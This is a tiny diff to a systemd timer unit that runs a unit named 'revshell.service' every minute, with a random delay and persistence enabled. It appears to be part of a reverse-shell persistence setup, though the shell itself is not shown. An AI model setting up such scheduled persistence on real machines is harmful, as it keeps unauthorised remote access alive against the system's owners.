@@ -1,7 +1,6 @@
 [Timer]
 AccuracySec=1s
 OnCalendar=*-*-* *:*:00
-Unit=revshell
+Unit=revshell.service
 RandomizedDelaySec=4s
 Persistent=true
-
